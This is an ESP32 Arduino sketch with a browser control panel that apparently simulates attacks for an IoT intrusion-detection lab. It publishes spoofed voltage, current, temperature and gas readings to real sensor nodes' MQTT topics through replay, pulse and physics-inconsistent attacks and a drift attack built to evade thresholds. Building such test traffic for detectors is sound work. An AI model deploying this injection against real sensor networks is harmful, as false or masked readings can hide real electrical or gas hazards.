#include <WiFi.h>
#include <WebServer.h>
#include <PubSubClient.h>
#include <ArduinoJson.h>

// ─── WiFi credentials ────────────────────────────────────────────────────────
const char* WIFI_SSID = "YOUR_WIFI_SSID";
const char* WIFI_PASS = "YOUR_WIFI_PASSWORD";

// ─── MQTT broker (Raspberry Pi IP) ───────────────────────────────────────────
const char* MQTT_BROKER = "192.168.1.100";
const int   MQTT_PORT   = 1883;
const char* CLIENT_ID   = "esp32_node3_attacker";

// ─── MQTT topics ─────────────────────────────────────────────────────────────
const char* TOPIC_NODE1     = "sensors/node1";
const char* TOPIC_NODE2     = "sensors/node2";
const char* TOPIC_SPOOF_LOG = "sensors/node3";

// ─── Attack type enum ────────────────────────────────────────────────────────
enum AttackType {
  ATK_NONE = 0,
  ATK_OVERCURRENT,
  ATK_OVERVOLTAGE,
  ATK_UNDERVOLTAGE,
  ATK_OVERTEMPERATURE,
  ATK_GAS_LEAK,
  ATK_SPOOFING,
  ATK_REPLAY,
  ATK_GRADUAL_DRIFT,
  ATK_PULSE,
  ATK_PHYSICS
};

// ─── Runtime state (updated by web GUI) ──────────────────────────────────────
AttackType    currentAttack   = ATK_NONE;
int           targetNode      = 1;       // 1 = Node1, 2 = Node2
bool          attackRunning   = false;
unsigned long attackInterval  = 2000;    // ms between packets

// Custom values entered in GUI (used by SPOOFING / REPLAY)
float cfg_v = 12.0, cfg_i = 1.0, cfg_p = 12.0;
float cfg_t = 32.0, cfg_h = 65.0, cfg_g = 400.0;

// Drift / Pulse internal state
float  drift_v = 0, drift_i = 0, drift_t = 0, drift_g = 0;
bool   pulse_high = false;
int    attackCycle = 0;

// Status for /status endpoint
String last_v = "-", last_i = "-", last_type = "none";
int    packetsSent = 0;

// ─── Stolen baseline values (pretend Node3 sniffed these) ────────────────────
float base_v1 = 10.73, base_i1 = 0.092, base_p1 = 0.99;
float base_t1 = 31.8,  base_h1 = 73.0,  base_g1 = 457.0;

float base_v2 = 8.24,  base_i2 = 0.980, base_p2 = 8.08;
float base_t2 = 31.7,  base_h2 = 61.0,  base_g2 = 383.0;

// ─── Objects ─────────────────────────────────────────────────────────────────
WiFiClient   wifiClient;
PubSubClient mqtt(wifiClient);
WebServer    server(80);

unsigned long lastAttackTime = 0;

// =============================================================================
//  HTML WEB GUI (stored in flash)
// =============================================================================
const char INDEX_HTML[] PROGMEM = R"rawhtml(
<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Node3 Attack Panel</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;font-size:13px;background:#f0f2f5;color:#222;padding:12px}
h1{font-size:16px;font-weight:700;margin-bottom:12px;color:#111}
.card{background:#fff;border:1px solid #dde;border-radius:10px;padding:12px 14px;margin-bottom:10px}
.card h2{font-size:12px;font-weight:600;color:#888;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
.seg{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:4px}
.seg button{padding:6px 12px;border-radius:6px;border:1px solid #ccc;background:#fff;font-size:12px;color:#444;cursor:pointer;font-weight:500}
.seg button.active{background:#1a7a56;color:#fff;border-color:#1a7a56}
.atk-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px}
.atk-grid button{padding:7px 5px;border-radius:6px;border:1px solid #ccc;background:#fff;font-size:11px;color:#444;cursor:pointer;font-weight:500;text-align:center}
.atk-grid button.active{background:#c0392b;color:#fff;border-color:#c0392b}
.row2{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px}
.field label{font-size:11px;color:#666;display:block;margin-bottom:3px}
input[type=number]{width:100%;padding:6px 8px;border:1px solid #ddd;border-radius:6px;font-size:12px;background:#fafafa}
.btn-start{width:100%;padding:11px;border-radius:8px;border:none;font-size:14px;font-weight:700;cursor:pointer;background:#1a7a56;color:#fff;margin-bottom:7px}
.btn-stop{width:100%;padding:11px;border-radius:8px;border:1px solid #c0392b;font-size:14px;font-weight:700;cursor:pointer;background:#fff5f5;color:#c0392b}
#sb{padding:8px 12px;border-radius:8px;font-size:13px;font-weight:600;margin-bottom:10px;background:#eafaf1;color:#1a7a56;border:1px solid #a9dfbf}
#sb.live{background:#fdf2f2;color:#c0392b;border-color:#f5b7b1}
#log{background:#1a1a2e;color:#7effd4;border-radius:8px;padding:10px;font-family:monospace;font-size:10px;height:90px;overflow-y:auto;white-space:pre-wrap}
.pkts{font-size:11px;color:#999;text-align:right;margin-top:4px}
</style></head><body>
<h1>&#128268; ESP32 Node 3 — Attack Panel</h1>
<div id="sb">&#9679; Idle — no attack running</div>

<div class="card">
  <h2>Target Node</h2>
  <div class="seg">
    <button id="bn1" class="active" onclick="setNode(1)">Node 1</button>
    <button id="bn2" onclick="setNode(2)">Node 2</button>
  </div>
</div>

<div class="card">
  <h2>Attack Type</h2>
  <div class="atk-grid">
    <button id="a1"  onclick="setAtk(1,'OVERCURRENT')">&#9889; Overcurrent</button>
    <button id="a2"  onclick="setAtk(2,'OVERVOLTAGE')">&#128262; Overvoltage</button>
    <button id="a3"  onclick="setAtk(3,'UNDERVOLTAGE')">&#128261; Undervoltage</button>
    <button id="a4"  onclick="setAtk(4,'OVERTEMPERATURE')">&#128293; Overtemperature</button>
    <button id="a5"  onclick="setAtk(5,'GAS_LEAK')">&#128167; Gas Leak</button>
    <button id="a6"  onclick="setAtk(6,'SPOOFING')">&#128373; Spoofing</button>
    <button id="a7"  onclick="setAtk(7,'REPLAY')">&#9654; Replay</button>
    <button id="a8"  onclick="setAtk(8,'GRADUAL_DRIFT')">&#128200; Gradual Drift</button>
    <button id="a9"  onclick="setAtk(9,'PULSE')">&#9889; Pulse Attack</button>
    <button id="a10" onclick="setAtk(10,'PHYSICS')">&#128300; Physics Attack</button>
  </div>
</div>

<div class="card">
  <h2>Custom Values (Spoofing / Replay)</h2>
  <div class="row2">
    <div class="field"><label>Voltage (V)</label><input type="number" id="fv" value="12.0" step="0.1"></div>
    <div class="field"><label>Current (A)</label><input type="number" id="fi" value="1.0" step="0.001"></div>
  </div>
  <div class="row2">
    <div class="field"><label>Power (W)</label><input type="number" id="fp" value="12.0" step="0.1"></div>
    <div class="field"><label>Temperature (C)</label><input type="number" id="ft" value="32.0" step="0.1"></div>
  </div>
  <div class="row2">
    <div class="field"><label>Humidity (%)</label><input type="number" id="fh" value="65" step="1"></div>
    <div class="field"><label>Gas (ppm)</label><input type="number" id="fg" value="400" step="1"></div>
  </div>
  <div class="field"><label>Interval (ms)</label><input type="number" id="intv" value="2000" step="100"></div>
</div>

<button class="btn-start" onclick="doStart()">&#9654; Start Attack</button>
<button class="btn-stop"  onclick="doStop()">&#9632; Stop</button>

<div class="card" style="margin-top:10px">
  <h2>Live Log</h2>
  <div id="log">Ready. Select attack and press Start.</div>
  <div class="pkts">Packets sent: <b id="pkt">0</b></div>
</div>

<script>
var selNode=1, selAtkId=0, selAtkName='NONE', polling=false;

function setNode(n){
  selNode=n;
  document.getElementById('bn1').classList.toggle('active',n===1);
  document.getElementById('bn2').classList.toggle('active',n===2);
}
function setAtk(id,name){
  selAtkId=id; selAtkName=name;
  for(var x=1;x<=10;x++) document.getElementById('a'+x).classList.remove('active');
  document.getElementById('a'+id).classList.add('active');
}
function getVals(){
  return {
    node:selNode, atk:selAtkId,
    v:document.getElementById('fv').value,
    i:document.getElementById('fi').value,
    p:document.getElementById('fp').value,
    t:document.getElementById('ft').value,
    h:document.getElementById('fh').value,
    g:document.getElementById('fg').value,
    intv:document.getElementById('intv').value,
    run:1
  };
}
function addLog(msg){
  var l=document.getElementById('log');
  var ts=new Date().toLocaleTimeString();
  l.textContent+='['+ts+'] '+msg+'\n';
  l.scrollTop=l.scrollHeight;
}
function doStart(){
  if(selAtkId===0){alert('Please select an attack type first!');return;}
  var p=new URLSearchParams(getVals());
  fetch('/config?'+p.toString()).then(function(){
    document.getElementById('sb').textContent='● LIVE — '+selAtkName+' on Node '+selNode;
    document.getElementById('sb').className='live';
    document.getElementById('pkt').textContent='0';
    addLog('Started: '+selAtkName+' → Node'+selNode);
    if(!polling){polling=true;doPoll();}
  });
}
function doStop(){
  fetch('/config?run=0').then(function(){
    document.getElementById('sb').textContent='● Idle — stopped';
    document.getElementById('sb').className='';
    addLog('Attack stopped.');
    polling=false;
  });
}
function doPoll(){
  if(!polling)return;
  fetch('/status').then(function(r){return r.json();}).then(function(d){
    document.getElementById('pkt').textContent=d.packets;
    if(d.last_type && d.last_type!='none'){
      addLog('Sent ['+d.last_type+'] V='+d.last_v+' I='+d.last_i);
    }
    var iv=parseInt(document.getElementById('intv').value)||2000;
    setTimeout(doPoll,iv+200);
  }).catch(function(){setTimeout(doPoll,3000);});
}
</script>
</body></html>
)rawhtml";

// =============================================================================
//  UTILITY: get node topic + baseline values
// =============================================================================
struct NodeInfo {
  const char* topic;
  const char* name;
  float v, i, p, t, h, g;
};

NodeInfo getNode() {
  if (targetNode == 1)
    return { TOPIC_NODE1, "node1", base_v1, base_i1, base_p1, base_t1, base_h1, base_g1 };
  else
    return { TOPIC_NODE2, "node2", base_v2, base_i2, base_p2, base_t2, base_h2, base_g2 };
}

// =============================================================================
//  MQTT: publish sensor payload + spoof log
// =============================================================================
void publishAttack(float v, float i, float p, float t, float h, float g, const char* atkName) {
  if (!mqtt.connected()) return;

  NodeInfo n = getNode();

  // Build sensor JSON — published to node topic, overlaps real node data
  StaticJsonDocument<256> doc;
  doc["voltage"]     = String(v, 2);
  doc["current"]     = String(i, 3);
  doc["power"]       = String(p, 2);
  doc["temperature"] = String(t, 1);
  doc["humidity"]    = String(h, 0);
  doc["gas"]         = String(g, 0);

  char buf[256];
  serializeJson(doc, buf);
  mqtt.publish(n.topic, buf, false);  // overlaps real node on broker

  // Spoof log → Pi IDS picks this up
  StaticJsonDocument<256> logDoc;
  logDoc["attack_type"]     = atkName;
  logDoc["target_node"]     = n.name;
  logDoc["spoofed_voltage"] = v;
  logDoc["spoofed_current"] = i;
  logDoc["spoofed_temp"]    = t;
  logDoc["spoofed_gas"]     = g;

  char logbuf[256];
  serializeJson(logDoc, logbuf);
  mqtt.publish(TOPIC_SPOOF_LOG, logbuf, false);

  // Update status
  last_v    = String(v, 2);
  last_i    = String(i, 3);
  last_type = String(atkName);
  packetsSent++;

  Serial.printf("[Node3/%s] → %s  V=%.2f  I=%.3f  T=%.1f  G=%.0f\n",
                atkName, n.name, v, i, t, g);
}

// =============================================================================
//  ATTACK FUNCTIONS
// =============================================================================

// 1. OVERCURRENT — current way above safe limit
void doOvercurrent() {
  NodeInfo n = getNode();
  float v = n.v;
  float i = 25.0 + (attackCycle % 5) * 0.5;   // 25–27.5A
  float p = v * i;
  publishAttack(v, i, p, n.t, n.h, n.g, "OVERCURRENT");
}

// 2. OVERVOLTAGE — voltage above safe limit
void doOvervoltage() {
  NodeInfo n = getNode();
  float v = 280.0 + (attackCycle % 10);        // 280–290V
  float i = n.i;
  float p = v * i;
  publishAttack(v, i, p, n.t, n.h, n.g, "OVERVOLTAGE");
}

// 3. UNDERVOLTAGE — voltage below minimum operating
void doUndervoltage() {
  NodeInfo n = getNode();
  float v = 1.5 - (attackCycle % 3) * 0.2;    // 1.5–0.9V
  if (v < 0.1) v = 0.1;
  float i = n.i;
  float p = v * i;
  publishAttack(v, i, p, n.t, n.h, n.g, "UNDERVOLTAGE");
}

// 4. OVERTEMPERATURE — temperature spike
void doOvertemperature() {
  NodeInfo n = getNode();
  float t = 85.0 + (attackCycle % 10);         // 85–94°C
  publishAttack(n.v, n.i, n.p, t, n.h, n.g, "OVERTEMPERATURE");
}

// 5. GAS LEAK — gas ppm spike
void doGasLeak() {
  NodeInfo n = getNode();
  float g = 950.0 + (attackCycle % 50) * 2.0; // 950–2000ppm
  publishAttack(n.v, n.i, n.p, n.t, n.h, g, "GAS_LEAK");
}

// 6. SPOOFING — sends fully custom values from GUI
void doSpoofing() {
  float p = cfg_v * cfg_i;
  publishAttack(cfg_v, cfg_i, p, cfg_t, cfg_h, cfg_g, "SPOOFING");
}

// 7. REPLAY — resends frozen stolen values repeatedly (uses GUI values as snapshot)
void doReplay() {
  float p = cfg_v * cfg_i;
  publishAttack(cfg_v, cfg_i, p, cfg_t, cfg_h, cfg_g, "REPLAY");
}

// 8. GRADUAL DRIFT — slowly shifts voltage and current each cycle
void doGradualDrift() {
  NodeInfo n = getNode();
  if (attackCycle == 1) {
    // Initialise drift from stolen baseline on first cycle
    drift_v = n.v;
    drift_i = n.i;
    drift_t = n.t;
    drift_g = n.g;
  }
  drift_v += 0.6f;   // +0.6V per tick — slow enough to evade simple threshold
  drift_i += 0.015f;
  drift_t += 0.3f;
  drift_g += 5.0f;

  // Reset when exceeding safe limits
  if (drift_v > 270.0f) drift_v = n.v;
  if (drift_i > 20.0f)  drift_i = n.i;
  if (drift_t > 80.0f)  drift_t = n.t;
  if (drift_g > 900.0f) drift_g = n.g;

  float p = drift_v * drift_i;
  publishAttack(drift_v, drift_i, p, drift_t, n.h, drift_g, "GRADUAL_DRIFT");
}

// 9. PULSE — alternates between normal and extreme on each tick
void doPulse() {
  NodeInfo n = getNode();
  pulse_high = !pulse_high;
  if (pulse_high) {
    // Extreme spike
    publishAttack(260.0, 19.0, 4940.0, n.t, n.h, n.g, "PULSE_HIGH");
  } else {
    // Back to normal baseline
    publishAttack(n.v, n.i, n.p, n.t, n.h, n.g, "PULSE_NORMAL");
  }
}

// 10. PHYSICS ATTACK — sends physically impossible / inconsistent combinations
//     e.g. P != V*I, or high power but near-zero voltage
void doPhysics() {
  NodeInfo n = getNode();
  int mode = attackCycle % 3;
  if (mode == 0) {
    // Power doesn't match V*I (real P would be ~0.5W but we report 5000W)
    publishAttack(n.v, n.i, 5000.0, n.t, n.h, n.g, "PHYSICS_WRONG_POWER");
  } else if (mode == 1) {
    // Zero voltage but high current (impossible)
    publishAttack(0.0, 18.0, 0.0, n.t, n.h, n.g, "PHYSICS_ZERO_V_HIGH_I");
  } else {
    // Negative current (impossible physical sensor reading)
    publishAttack(n.v, -5.0, n.v * -5.0, n.t, n.h, n.g, "PHYSICS_NEGATIVE_I");
  }
}

// =============================================================================
//  WEB SERVER HANDLERS
// =============================================================================

void handleRoot() {
  server.send_P(200, "text/html", INDEX_HTML);
}

void handleConfig() {
  // Parse run flag
  if (server.hasArg("run")) {
    attackRunning = (server.arg("run").toInt() == 1);
    if (!attackRunning) {
      currentAttack = ATK_NONE;
      attackCycle = 0;
      packetsSent = 0;
      last_type = "none";
      Serial.println("[Web] Attack stopped.");
    }
  }

  if (server.hasArg("node"))  targetNode    = server.arg("node").toInt();
  if (server.hasArg("atk"))   currentAttack = (AttackType)server.arg("atk").toInt();
  if (server.hasArg("intv"))  attackInterval= max(200UL, (unsigned long)server.arg("intv").toInt());
  if (server.hasArg("v"))     cfg_v  = server.arg("v").toFloat();
  if (server.hasArg("i"))     cfg_i  = server.arg("i").toFloat();
  if (server.hasArg("p"))     cfg_p  = server.arg("p").toFloat();
  if (server.hasArg("t"))     cfg_t  = server.arg("t").toFloat();
  if (server.hasArg("h"))     cfg_h  = server.arg("h").toFloat();
  if (server.hasArg("g"))     cfg_g  = server.arg("g").toFloat();

  if (attackRunning) {
    // Reset drift/pulse state when a new attack starts
    drift_v = drift_i = drift_t = drift_g = 0;
    pulse_high = false;
    attackCycle = 0;
    Serial.printf("[Web] Attack started: type=%d node=%d interval=%lums\n",
                  currentAttack, targetNode, attackInterval);
  }

  server.send(200, "text/plain", "OK");
}

void handleStatus() {
  StaticJsonDocument<128> doc;
  doc["packets"]   = packetsSent;
  doc["last_v"]    = last_v;
  doc["last_i"]    = last_i;
  doc["last_type"] = last_type;
  doc["running"]   = attackRunning ? 1 : 0;
  char buf[128];
  serializeJson(doc, buf);
  server.send(200, "application/json", buf);
}

void handleNotFound() {
  server.send(404, "text/plain", "Not found");
}

// =============================================================================
//  WIFI + MQTT HELPERS
// =============================================================================

void connectWifi() {
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  Serial.print("[WiFi] Connecting");
  unsigned long t = millis();
  while (WiFi.status() != WL_CONNECTED && millis()-t < 15000) {
    delay(500); Serial.print(".");
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n[WiFi] Connected: " + WiFi.localIP().toString());
    Serial.println("[Web]  Open http://" + WiFi.localIP().toString() + "/");
  } else {
    Serial.println("\n[WiFi] Failed — check credentials");
  }
}

void connectMQTT() {
  int tries = 0;
  while (!mqtt.connected() && tries < 5) {
    Serial.print("[MQTT] Connecting...");
    if (mqtt.connect(CLIENT_ID)) {
      Serial.println(" OK");
    } else {
      Serial.printf(" failed rc=%d\n", mqtt.state());
      delay(2000);
      tries++;
    }
  }
}

// =============================================================================
//  SETUP
// =============================================================================
void setup() {
  Serial.begin(115200);
  delay(300);
  Serial.println("\n========================================");
  Serial.println("  ESP32 Node 3 — Attack Simulator");
  Serial.println("========================================");

  connectWifi();

  // Web server routes
  server.on("/",        handleRoot);
  server.on("/config",  handleConfig);
  server.on("/status",  handleStatus);
  server.onNotFound(handleNotFound);
  server.begin();
  Serial.println("[Web] Server started on port 80");

  // MQTT
  mqtt.setServer(MQTT_BROKER, MQTT_PORT);
  mqtt.setBufferSize(512);
  connectMQTT();

  Serial.println("[Ready] Open GUI in browser at ESP32 IP above");
}

// =============================================================================
//  LOOP
// =============================================================================
void loop() {
  // Keep web server running
  server.handleClient();

  // Keep MQTT alive
  if (!mqtt.connected()) connectMQTT();
  mqtt.loop();

  // Run attack if active
  if (attackRunning && currentAttack != ATK_NONE) {
    unsigned long now = millis();
    if (now - lastAttackTime >= attackInterval) {
      lastAttackTime = now;
      attackCycle++;

      switch (currentAttack) {
        case ATK_OVERCURRENT:     doOvercurrent();     break;
        case ATK_OVERVOLTAGE:     doOvervoltage();     break;
        case ATK_UNDERVOLTAGE:    doUndervoltage();    break;
        case ATK_OVERTEMPERATURE: doOvertemperature(); break;
        case ATK_GAS_LEAK:        doGasLeak();         break;
        case ATK_SPOOFING:        doSpoofing();        break;
        case ATK_REPLAY:          doReplay();          break;
        case ATK_GRADUAL_DRIFT:   doGradualDrift();    break;
        case ATK_PULSE:           doPulse();           break;
        case ATK_PHYSICS:         doPhysics();         break;
        default:                  break;
      }
    }
  }
}